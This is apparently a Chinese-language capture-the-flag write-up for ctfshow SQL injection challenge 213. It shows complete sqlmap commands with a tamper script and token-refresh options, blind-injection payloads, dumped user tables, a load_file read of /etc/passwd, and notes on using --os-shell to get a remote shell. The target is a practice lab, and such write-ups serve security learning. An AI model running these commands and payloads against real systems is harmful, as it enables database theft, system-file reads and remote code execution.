## ctfshow-sql213

#####  sqlmap的使用手册: https://github.com/sqlmapproject/sqlmap/wiki/Usage

#####  比较详细的使用教程 : https://www.freebuf.com/sectool/164608.html



```
 要求：
练习使用--os-shell 一键getshell
```



```mysql
查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";

//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match('/ |\*/', $str);
}
 
 //1.获得字符串后先base64解密			 base64_decode($id)
 //2.解密后再反转一次字符串				strrev(base64_decode($id))
 //3.反转一次字符串后再base64解密			base64_decode(strrev(base64_decode($id)))
 //4.解密后再反转一次字符串				strrev(base64_decode(strrev(base64_decode($id))))
 //5.所以一共解密两次字符串所以一共要加密两次,两次中间都要穿插一次反转,反转逻辑为反转两次就是正常字符串所以不需要考虑直接反转
 //6.因为是倒着来所以写脚本的时候要先反转再加密
 
 添加了空格过滤
 改为chr(0x0a)
```



```shell
–user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入
–-referer=REFERER sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入
使用–-data 调整sqlmap的请求方式
--data即为post请求
使用--method 调整sqlmap的请求方式
--method强制使用给定的HTTP方法（例如put）
注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单(form)提交的，put接收不到
使用--cookie 调整sqlmap的cookie
cookie=COOKIE     HTTP Cookieheader 值
使用--safe-url 调整sqlmap的访问方式
--safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下
使用--safe-url 调整sqlmap的访问请求次数
--safe-freq=SAFE..  测试一个给定安全网址的访问请求次数
 
--batch            从不询问用户输入，使用所有默认配置

--current-db       web当前使用的数据库

 --prefix=PREFIX     注入payload字符串前缀

--dbms=DBMS         强制后端的DBMS为此值(例如--dbms=mysql)

-v 3				参数来查看Payload
```



```
注入顺序
1.获取当前MySQL中的所有数据库
2.获取当前数据库名字
3.获取数据库下的数据表
4.获取表下的列名
5.导出数据
```



```mysql
layui.use('form', function(){
  var form = layui.form;
  form.on('submit(*)', function(data){
    $.ajax({
      url:'api/getToken.php'
    });
    var id = data.field['id'];
    var table = layui.table;
    table.reload('user_table', {
      url:'api/?id='+id
    })
    return false; //阻止表单跳转。如果需要表单跳转，去掉这段即可。
  });


通过抓包分析，在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php
请求index.php之前还会请求一次getToken.php，也就是说每注入一次，要先访问一次getToken.php


–-safe-url 设置在测试目标地址前访问的安全链接
–-safe-freq 设置两次注入测试前访问安全链接的次数

          
--tamper 脚本使用自带的也可以 

          

查询数据库

sqlmap.py -u http://b8ec3feb-2c69-4968-a841-e7f7774e6466.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; td_cookie=1865350859; PHPSESSID=ljmnm94mpp13qreo8nb4d17aoj" --safe-url="http://b8ec3feb-2c69-4968-a841-e7f7774e6466.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 --dbs

[13:45:56] [DEBUG] used the default behavior, running in batch mode
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: id (PUT)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6806=6806 AND 'tibB'='tibB
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9496 FROM (SELECT(SLEEP(5)))QEWv) AND 'COQy'='COQy
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
         
[13:46:13] [DEBUG] performed 73 queries in 2.86 seconds
available databases [5]:
[*] ctfshow_web
[*] information_schema
[*] mysql
[*] performance_schema
[*] test

查表
sqlmap.py -u http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=qmgbjgs652o8b334a1v5e7mr2u; td_cookie=1691265794" --safe-url="http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 -D ctfshow_web --tables
          

Database: ctfshow_web
[1 table]
+--------------+
| ctfshow_user |
+--------------+

查列名
sqlmap.py -u http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; PHPSESSID=qmgbjgs652o8b334a1v5e7mr2u; td_cookie=1691265794" --safe-url="http://1f302e38-b6a5-4474-a4e3-1d47d85a5b9f.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 -D ctfshow_web -T ctfshow_user --columns

[13:48:23] [DEBUG] performed 83 queries in 3.17 seconds
Database: ctfshow_web
Table: ctfshow_user
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| pass     | varchar(255) |
| username | varchar(255) |
+----------+--------------+
          
查内容
sqlmap.py -u http://de86ad72-13f1-4de9-8b40-68f61b517cb2.chall.ctf.show:8080/api/index.php --method=PUT --data="id=1" --headers="content-type:text/plain" --referer="ctf.show" --cookie="UM_distinctid=177dbc429491f1-0b465ef853f053-53e356a-15f900-177dbc4294aa66; td_cookie=1869385004; PHPSESSID=5jfjdtq78jogchljufud2n3n6n" --safe-url="http://de86ad72-13f1-4de9-8b40-68f61b517cb2.chall.ctf.show:8080/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --batch --tamper=210-212ctfshow-tamper -v 3 -D ctfshow_web -T ctfshow_flavis --dump


Database: ctfshow_web
Table: ctfshow_user
[21 entries]
+----+--------------+----------+
| id | pass         | username |
+----+--------------+----------+
| 1  | admin__      | admin    |
| 2  | 111          | user1    |
| 3  | 222          | user2    |
| 4  | passwordAUTO | userAUTO |
| 5  | passwordAUTO | userAUTO |
| 6  | passwordAUTO | userAUTO |
| 7  | passwordAUTO | userAUTO |
| 8  | passwordAUTO | userAUTO |
| 9  | passwordAUTO | userAUTO |
| 10 | passwordAUTO | userAUTO |
| 11 | passwordAUTO | userAUTO |
| 12 | passwordAUTO | userAUTO |
| 13 | passwordAUTO | userAUTO |
| 14 | passwordAUTO | userAUTO |
| 15 | passwordAUTO | userAUTO |
| 16 | passwordAUTO | userAUTO |
| 17 | passwordAUTO | userAUTO |
| 18 | passwordAUTO | userAUTO |
| 19 | passwordAUTO | userAUTO |
| 20 | passwordAUTO | userAUTO |
| 21 | passwordAUTO | userAUTO |
+----+--------------+----------+

          
          
          
select load_file('/etc/passwd');
          
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X FontServer:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin



          
          
          
          
          
          
          
<?php  
error_reporting(0);
session_start();
$_SESSION['ctfshow']='ctfshow';?>
<!DOCTYPE html><html>
<head><meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">    <title>CTFshow-web入门</title>
    <link rel="stylesheet" href="layui/css/layui.css">
    <script src="layui/layui.js"></script>
    <script src="js/jquery-3.2.1.min.js"></script>
</head>
<body id="top">  <ul class="layui-nav" lay-filter="nav" style="z-index: 9999">
	<li class="layui-nav-item layui-this"><a href="index.php">CTFshow-web入门</a></li>
    <li class="layui-nav-item">
    <a href="javascript:;">SELECT模块<span class="layui-nav-more"></span></a>
    <dl class="layui-nav-child">
          <dd><a href="javascript:layer.msg('请移步web171-web175');">无过滤注入</a></dd>          	   <dd><a href="javascript:layer.msg('请移步web176-web189');">过滤注入</span></a>		</dd>
          <dd><a href="javascript:layer.msg('请移步web190-web194');">布尔盲注</span></a>		</dd>
          <dd><a href="javascript:layer.msg('请移步web195-web200');">堆叠注入</span></a>		</dd>
          <dd><a href="sqlmap.php">sqlmap<span class="layui-badge-dot"></span></a></dd>   
          <dd><a href="javascript:layer.msg('暂未开放，敬请期待');">等待开放</a></dd>        	</dl></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未开放，敬请期待');">UPDATE模块</a></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未开放，敬请期待');">INSERT模块</a></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未开放，敬请期待');">DELETE模块</a></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未 ?放，敬请期待');">FILE模块</a></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未开放，敬请期待');">ERROR模块</a></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未开放 ，敬请期待');">EVAL模块</a></li>
    <li class="layui-nav-item "><a href="javascript:layer.msg('暂未开放，敬请期待');">OTHER模块</a></li>
</ul>
    <div class="layui-container">
          <div class="layui-row" style="height: 40px;"></div>
          	<div class="layui-elem-quote">
          		<p id="result"><a href="https://ctfshow.lanzoui.com/i4wlziac1de" target="_blank">
          		<i class="layui-icon layui-icon-circle-dot"></i> sqlmap最新版下载</a></p>   
          		<p><i class="layui-icon layui-icon-circle-dot"></i>练习使用--os-shell 一键getshehl</p>          
          		<br><p>难度系数 <i class="layui-icon layui-icon-rate-solid" style="color: #5FB878;"></i>
          		<i class="layui-icon layui-icon-rate-solid" style="color: #5FB878;"></i></p>
          	</div>
            <div class="layui-row">
            <div class="layui-progress layui-progress-big" lay-showPercent="yes">
          	<div class="layui-progress-bar" lay-percent="43/150" style="color: #fff"></div>
            </div>
            </div>
            <div class="layui-row">
            <p style="padding top: 30px;"> ?  ??o|</h>
            <pre class="layui-code">  //拼?'sql语句查找指定ID用户  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";        </pre>        <p style="padding-top: 30px;">返回逻辑</p>        <pre class="layui-code">  //对查询字符进行解密    function decode($id){      return strrev(base64_decode(strrev(base64_decode($id))));    }  function waf($str){      return preg_match('/ |\*/', $str);  }          </pre>    </div>        <div class="layui-row">      <div class="layui-form" action="api/">        <div class="layui-form-item" >



--os-shell 就行 
选择4php 选择爆破4 输入路径就行

```

